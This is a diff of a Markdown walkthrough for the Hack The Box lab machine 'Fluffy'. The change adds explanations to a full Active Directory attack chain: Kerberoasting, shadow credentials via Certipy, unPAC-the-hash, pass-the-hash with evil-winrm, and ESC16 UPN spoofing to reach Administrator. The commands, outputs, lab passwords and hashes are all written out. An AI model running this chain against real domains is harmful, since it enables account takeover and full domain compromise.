@@ -323,12 +323,112 @@ Good, import all of them to **bloodhound GUI** and start researching the interna
 
 ![Upgrade_Notice.pdf](assets/image/htb/fluffy/2026-10-25_09-06.png){: w="700" }
 
+First of all, we can see that user **J.FLEISCHMAN@FLUFFY.HTB** is not member of any special groups and it also does not have any **Outbound Object Control**. So we will ignore it and continue with another. Luckily, from SMB service we have found a new credential **p.agila:prometheusx-303**:<br>
+
 ![Upgrade_Notice.pdf](assets/image/htb/fluffy/2026-10-25_09-07.png){: w="700" }
 
 ![Upgrade_Notice.pdf](assets/image/htb/fluffy/2026-10-25_09-08.png){: w="700" }
 
+So from the bloodhound GUI, we can see that **p.agila** is the member of **Service Account Managers**. This group has **GenericAll** permission on group **Service Accounts** - which has **GenericWrite** on 3 users **ca_svc, winrm_svc and ldap_svc**. So if we add **p.agila** to **Service Accounts** (abuse **GenericAll**), it will have **GenericWrite** on three of svc accounts.<br>
+In addition to, **ca_svc** is marked as **Tire Zero** in bloodhound so I belive that if we can escalate on it, we will make our attack surface larger !!<br>
+Three of users which are members of **Service Accounts** have SPN, so I try kerberoasting first:
 ```
-└─$ certipy find -u P.AGILA@fluffy.htb -p 'prometheusx-303' -dc-ip 10.129.62.147 -vulnerable -stdout
+└─$ impacket-GetUserSPNs -dc-ip 10.129.62.147 fluffy.htb/P.AGILA:prometheusx-303 -request-user ca_svc
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName  Name    MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
+--------------------  ------  ---------------------------------------------  --------------------------  --------------------------  ----------
+ADCS/ca.fluffy.htb    ca_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:07:50.136701  2025-05-21 18:21:15.969274             
+
+
+
+[-] CCache file is not found. Skipping...
+[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+```
+The error KRB_AP_ERR_SKEW(Clock skew too great) occurs because the time difference between our attacking machine and the target domain controller (DC) exceeds 5 minutes (300 seconds). Kerberos strictly requires the client and server clocks to be synchronized to prevent replay attacks
+```
+└─$ sudo timedatectl set-ntp off
+└─$ sudo rdate -n 10.129.62.147
+```
+Both above commands will help us synchronize the clocks between our machine and the DC target.<br>
+Now try again with kerberoast by using **impacket-GetuserSPNs**:
+```
+└─$ impacket-GetUserSPNs -dc-ip 10.129.62.147 fluffy.htb/P.AGILA:prometheusx-303 -request-user ca_svc
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName  Name    MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
+--------------------  ------  ---------------------------------------------  --------------------------  --------------------------  ----------
+ADCS/ca.fluffy.htb    ca_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:07:50.136701  2025-05-21 18:21:15.969274             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$fc1ead87a213b0da1b7bc9aca9b636ac$3f656088cc1fd78d7b1cb431e6740c47f92e712889d3f316d7c55a262f10c10a14507036d581609c897aac0ccc0ba51d49274bfdf05c3f14e26ca49028d23ad5694a9f02dbc670ae4405c11be657c726e72ac1f3d3dc09f0e44685270cd7df1515cffcd418e8c41ff1db1ab5ee85b48ab0900891d914cfa411faf27300aafef2ec7eeae299697fc456d02c5f11cfc95b9003bcbea275dca542350936dea317ceed5ed7f8d0a3d7e676121a6edaaabc292f4154ba10014c1193377fdcb95ad22a373fb907db9acc28c20888576d0631024e6ee5315ce8bacaec8fba81411d7935c9a43eb9bb924542c3cb5f125f229a4bc996e8ac0e420a8f425225dac98c2de266a73e600805bbaf08fd7aba41c83a587de10cdf17b1e2b073c602971cdda350e756a67787700ac0f1b9f322bdda83fa63752aa225ba49c93d97f84e1cb8f5c91a3a76d1399a95602a1a3761edf861ed1604f415679f9f1808c4b0869a088349b921aecc1c67eb8bb008a2660c40cd6beae70dd886b1ae513d3914413f7e47edfd2c56aa9d7c0898816d3d9b9812bd06ee9c6ae11f380cae216cd1cb0ebd7bd0596f227b588bf818c9796fba7d931658e2567335af4a7baedc984f8911dfc686e3f188df85af601a899e810769022a504c3cc5ae85c815a99f8223f7bb03c6f13dd4db2f223a30fb586badcf59b3b45f2eea701e24dab0d85d57566c19942b5a5b07163f3b44d664fcb424fe936e37458899cbacc584c52d6546595ce032ede343ad5dca65f3d5f248e4313de74e295934ed79d62343c7951e3f10e14cb863ca59606d37a11b70506aa7ad7885e1676389043d26c1b780fe74b211350ced66b86f00636c3641a46be2b8c98a5b2f5a8d86f9107dde42b795b764a2f4e35ba331bdb82f99ec0cd37f0ad5d8311578379b0f2166291f1484f81dca3ef6ad09e741378ce91ec18cdae7f6d2d6e41055764bd9b26c9600e5da31072f8c19056988219426b310f1726ce06b172d8bec2eea17f3ce58ddfe763b291b977eaa675a952c20ae0a6837829c730af7bfdc8e57e931adb48574b8b740159b093260e6a1f97ad1f4ef3c28fbdb14f832a3c4a1297cc783dbd5dcc9472827a1eb29c3ef7e05dbf5b31495eb79441b533da9a615f9ab9b1b525b2ad36ada01076a4071f4c0261d2932deedf964e8a2f72baad3ccbd696b34fc627fed289c70e36c1a884356dac3857ce447cc6f6bd3fc485781afdc6ab4e646b8f4df3eda1f284211ea19738458c0bacff23be757722d8a9f0c9d47cca85119b4239936e47466fd8f637aecc69656a30b533f6cc29f2a14679ff4b88b89ba8ffec36a8b51b88c0d11c934228071ec4e3659d319e10c4c727cdec0469e08cee4579024253c29ca79e1403f036ab58a3d7828a5529d5ac92de00a65588a002fafb476d77e3299205c87e85e71416406462b9fdaddec16ce0ef601c94977d57632973b74642489e70d4c7e549184764148
+```
+Good, now try hashcat with hope that we can findout the password of user **ca_svc** but....nothing happens :(<br>
+
+We need to change our thinking to other methods. I try to search on Google to find anything related to **GenericWrite** abuse and fortunately: **Shadow Credentials** saves my life. Anyway, we need to understand what is Shadow Credentials attack and how it works behind the scence.<br>
+First, we talk about **PKINIT**: *PKINIT (Public Key Cryptography for Initial Authentication) is an extension to the Kerberos protocol. The traditional Kerberos initial authentication relies on a password-derived key, while PKINIT allows the use of public key cryptography (such as smart cards or certificates) to complete the initial authentication and obtain a Ticket Granting Ticket (TGT).*<br>
+It means, normally to authenticate with Kerberos we must use either NTLM hash or scret key but now, with the help of PKINIT, we can use a public key cryptography to achive the similar purpose.
+
+*This is how PKINIT works behind the scence:*
+- The client possesses a private key (usually stored in a TPM or smart card) and sends an authentication request signed with the private key to the domain controller (KDC).
+- The KDC looks up the corresponding public key in the **msDS-KeyCredentialLink** attribute of the account.
+- The KDC verifies the signature using the public key, and if successful, issues a TGT
+
+Relies on above flow, we find one weak point here *The KDC looks up the corresponding public key in the msDS-KeyCredentialLink attribute of the account*. If we can insert our fake public key to **msDS-KeyCredentialLink** attribute of account target, yes of course, we can authenticate as the account target.
+
+As we discuss above, firstly we will add **p.agila** to group **Service Accounts**:
+```
+└─$ bloodyAD -d fluffy.htb -u p.agila -p prometheusx-303 --host 10.129.62.147 add groupMember "service accounts" "p.agila"
+[+] p.agila added to service accounts
+```
+Then, by using **certipy** we can insert our public key to **msDS-KeyCredentialLink** attribute of **winrm_svc**:
+```
+└─$ certipy shadow -account winrm_svc -dc-ip 10.129.62.147 -u p.agila -p prometheusx-303 add                              
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'winrm_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'a99be39e5e8347eb83b98675ff5d0d23'
+[*] Adding Key Credential with device ID 'a99be39e5e8347eb83b98675ff5d0d23' to the Key Credentials for 'winrm_svc'
+[*] Successfully added Key Credential with device ID 'a99be39e5e8347eb83b98675ff5d0d23' to the Key Credentials for 'winrm_svc'
+[*] Saving certificate and private key to 'winrm_svc.pfx'
+[*] Saved certificate and private key to 'winrm_svc.pfx'
+```
+Next authenticate as user **winrm_svc**:
+```
+└─$ certipy auth -pfx winrm_svc.pfx -username winrm_svc -domain fluffy.htb -dc-ip 10.129.62.147
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[!] Could not find identity in the provided certificate
+[*] Using principal: 'winrm_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'winrm_svc.ccache'
+[*] Wrote credential cache to 'winrm_svc.ccache'
+[*] Trying to retrieve NT hash for 'winrm_svc'
+[*] Got hash for 'winrm_svc@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:33bd09dcd697600edf6b3a7af4875767
+```
+Wait a minute, I want to explain a little bit why we can achive hash for **winrm_svc@fluffy.htb**, where is it from :D<br>
+*When a user authenticates via PKINIT (certificate-based logon), Microsoft's implementation embeds the user's NT hash inside the PAC of the issued ticket, encrypted with the session key from the AS exchange. This exists purely for compatibility: it lets a certificate-authenticated user seamlessly fall back to NTLM-only services without re-entering a password. But the DC makes no distinction between the legitimate user and an attacker holding the certificate — so Certipy simply requests a service ticket for the account itself, decrypts the PAC with the session key it already holds, and pulls out the hash. This is the **unPAC the Hash** technique: abusing a legitimate convenience feature to turn a certificate into an NT hash, no cracking required.*<br>
+
+ Now using **ptH** technique to get a shell from **winrm_svc** and read the user flag:
+```
+└─$ evil-winrm -i 10.129.62.147 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
+```
+
+```
+Evil-WinRM* PS C:\users\winrm_svc\Desktop> type user.txt
+```
+## P3 & P4
+Similarly, we can easily findout the NLTM hash of **ca_svc**. Then we need to basic enumerate for ADCS:
+```
+└─$ certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.62.147 -vulnerable -stdout
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
 [*] Finding certificate templates
@@ -378,81 +478,16 @@ Certificate Authorities
         Enroll                          : FLUFFY.HTB\Cert Publishers
                                           FLUFFY.HTB\Administrators
         Read                            : FLUFFY.HTB\Administrators
+    [!] Vulnerabilities
+      ESC16                             : Security Extension is disabled.
+    [*] Remarks
+      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
 Certificate Templates                   : [!] Could not find any certificate templates
 ```
+**ESC16** - interesting finding !!<br>
+*ESC16 is a privilege escalation misconfiguration in Active Directory Certificate Services (AD CS) where the Certificate Authority (CA) has disabled the SID security extension for all certificates it issues, not just those from a specific template . This occurs when the OID 1.3.6.1.4.1.311.25.2 is added to the CA's DisableExtensionList, causing issued certificates to lack the SID mapping that domain controllers rely on for secure authentication . As a result, if the domain's strong certificate binding enforcement is not set to the strictest level, an attacker who can manipulate a user account's UPN can request a certificate and authenticate as another principal, effectively escalating privileges across the domain.*
 
-```
-└─$ impacket-GetUserSPNs -dc-ip 10.129.62.147 fluffy.htb/P.AGILA:prometheusx-303 -request-user ca_svc
-Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
-
-ServicePrincipalName  Name    MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
---------------------  ------  ---------------------------------------------  --------------------------  --------------------------  ----------
-ADCS/ca.fluffy.htb    ca_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:07:50.136701  2025-05-21 18:21:15.969274             
-
-
-
-[-] CCache file is not found. Skipping...
-[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
-```
-
-```
-└─$ sudo timedatectl set-ntp off
-└─$ sudo rdate -n 10.129.62.147
-└─$ impacket-GetUserSPNs -dc-ip 10.129.62.147 fluffy.htb/P.AGILA:prometheusx-303 -request-user ca_svc
-Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
-
-ServicePrincipalName  Name    MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
---------------------  ------  ---------------------------------------------  --------------------------  --------------------------  ----------
-ADCS/ca.fluffy.htb    ca_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:07:50.136701  2025-05-21 18:21:15.969274             
-
-
-
-[-] CCache file is not found. Skipping...
-$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$fc1ead87a213b0da1b7bc9aca9b636ac$3f656088cc1fd78d7b1cb431e6740c47f92e712889d3f316d7c55a262f10c10a14507036d581609c897aac0ccc0ba51d49274bfdf05c3f14e26ca49028d23ad5694a9f02dbc670ae4405c11be657c726e72ac1f3d3dc09f0e44685270cd7df1515cffcd418e8c41ff1db1ab5ee85b48ab0900891d914cfa411faf27300aafef2ec7eeae299697fc456d02c5f11cfc95b9003bcbea275dca542350936dea317ceed5ed7f8d0a3d7e676121a6edaaabc292f4154ba10014c1193377fdcb95ad22a373fb907db9acc28c20888576d0631024e6ee5315ce8bacaec8fba81411d7935c9a43eb9bb924542c3cb5f125f229a4bc996e8ac0e420a8f425225dac98c2de266a73e600805bbaf08fd7aba41c83a587de10cdf17b1e2b073c602971cdda350e756a67787700ac0f1b9f322bdda83fa63752aa225ba49c93d97f84e1cb8f5c91a3a76d1399a95602a1a3761edf861ed1604f415679f9f1808c4b0869a088349b921aecc1c67eb8bb008a2660c40cd6beae70dd886b1ae513d3914413f7e47edfd2c56aa9d7c0898816d3d9b9812bd06ee9c6ae11f380cae216cd1cb0ebd7bd0596f227b588bf818c9796fba7d931658e2567335af4a7baedc984f8911dfc686e3f188df85af601a899e810769022a504c3cc5ae85c815a99f8223f7bb03c6f13dd4db2f223a30fb586badcf59b3b45f2eea701e24dab0d85d57566c19942b5a5b07163f3b44d664fcb424fe936e37458899cbacc584c52d6546595ce032ede343ad5dca65f3d5f248e4313de74e295934ed79d62343c7951e3f10e14cb863ca59606d37a11b70506aa7ad7885e1676389043d26c1b780fe74b211350ced66b86f00636c3641a46be2b8c98a5b2f5a8d86f9107dde42b795b764a2f4e35ba331bdb82f99ec0cd37f0ad5d8311578379b0f2166291f1484f81dca3ef6ad09e741378ce91ec18cdae7f6d2d6e41055764bd9b26c9600e5da31072f8c19056988219426b310f1726ce06b172d8bec2eea17f3ce58ddfe763b291b977eaa675a952c20ae0a6837829c730af7bfdc8e57e931adb48574b8b740159b093260e6a1f97ad1f4ef3c28fbdb14f832a3c4a1297cc783dbd5dcc9472827a1eb29c3ef7e05dbf5b31495eb79441b533da9a615f9ab9b1b525b2ad36ada01076a4071f4c0261d2932deedf964e8a2f72baad3ccbd696b34fc627fed289c70e36c1a884356dac3857ce447cc6f6bd3fc485781afdc6ab4e646b8f4df3eda1f284211ea19738458c0bacff23be757722d8a9f0c9d47cca85119b4239936e47466fd8f637aecc69656a30b533f6cc29f2a14679ff4b88b89ba8ffec36a8b51b88c0d11c934228071ec4e3659d319e10c4c727cdec0469e08cee4579024253c29ca79e1403f036ab58a3d7828a5529d5ac92de00a65588a002fafb476d77e3299205c87e85e71416406462b9fdaddec16ce0ef601c94977d57632973b74642489e70d4c7e549184764148
-```
-```
-└─$ bloodyAD -d fluffy.htb -u p.agila -p prometheusx-303 --host 10.129.62.147 add groupMember "service accounts" "p.agila"
-[+] p.agila added to service accounts
-```
-
-```
-└─$ certipy shadow -account winrm_svc -dc-ip 10.129.62.147 -u p.agila -p prometheusx-303 add                              
-Certipy v5.1.0 - by Oliver Lyak (ly4k)
-
-[*] Targeting user 'winrm_svc'
-[*] Generating certificate
-[*] Certificate generated
-[*] Generating Key Credential
-[*] Key Credential generated with DeviceID 'a99be39e5e8347eb83b98675ff5d0d23'
-[*] Adding Key Credential with device ID 'a99be39e5e8347eb83b98675ff5d0d23' to the Key Credentials for 'winrm_svc'
-[*] Successfully added Key Credential with device ID 'a99be39e5e8347eb83b98675ff5d0d23' to the Key Credentials for 'winrm_svc'
-[*] Saving certificate and private key to 'winrm_svc.pfx'
-[*] Saved certificate and private key to 'winrm_svc.pfx'
-```
-```
-└─$ certipy auth -pfx winrm_svc.pfx -username winrm_svc -domain fluffy.htb -dc-ip 10.129.62.147
-Certipy v5.1.0 - by Oliver Lyak (ly4k)
-
-[*] Certificate identities:
-[*]     No identities found in this certificate
-[!] Could not find identity in the provided certificate
-[*] Using principal: 'winrm_svc@fluffy.htb'
-[*] Trying to get TGT...
-[*] Got TGT
-[*] Saving credential cache to 'winrm_svc.ccache'
-[*] Wrote credential cache to 'winrm_svc.ccache'
-[*] Trying to retrieve NT hash for 'winrm_svc'
-[*] Got hash for 'winrm_svc@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:33bd09dcd697600edf6b3a7af4875767
-```
-
-```
-└─$ evil-winrm -i 10.129.62.147 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
-```
-
-```
-Evil-WinRM* PS C:\users\winrm_svc\Desktop> type user.txt
-```
-
+Okey, firstly change UPN (User principle name) of ca_svc to **administrator@fluffy.htb**:
 ```
 └─$ certipy account -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.62.147 -user ca_svc -upn administrator@fluffy.htb update
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
@@ -461,6 +496,7 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
     userPrincipalName                   : administrator@fluffy.htb
 [*] Successfully updated 'ca_svc'
 ```
+Next request a certificate by using user **ca_svc** (now its UPN is **administrator@fluffy.htb**)
 ```
 └─$ certipy req -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.62.147 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
@@ -475,6 +511,8 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
 [*] Wrote certificate and private key to 'administrator.pfx'
 ```
+Before we authenticate with **administrator.pfx**, we need to rechange the UPN of **ca_svc** again. Why ?<br>
+*Before authenticating with administrator.pfx, we must restore ca_svc's UPN back to ca_svc@fluffy.htb because the certificate's SAN contains the UPN administrator@fluffy.htb, and during PKINIT the KDC resolves that UPN to an account in AD. Since you previously changed ca_svc's UPN to administrator@fluffy.htb to obtain the certificate, AD currently holds two accounts with that same UPN — the real Administrator and the spoofed ca_svc*
 ```
 └─$ certipy account -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.62.147 -user ca_svc -upn ca_svc@fluffy.htb update
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
@@ -483,6 +521,7 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
     userPrincipalName                   : ca_svc@fluffy.htb
 [*] Successfully updated 'ca_svc'
 ```
+Next authenticate as user **administrator**:
 ```
 └─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.62.147 -u administrator -domain fluffy.htb                                                 
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
@@ -497,6 +536,7 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
 ```
+Again, use **ptH** and read the root flag:
 ```
 └─$ evil-winrm -i 10.129.62.147 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
 ```
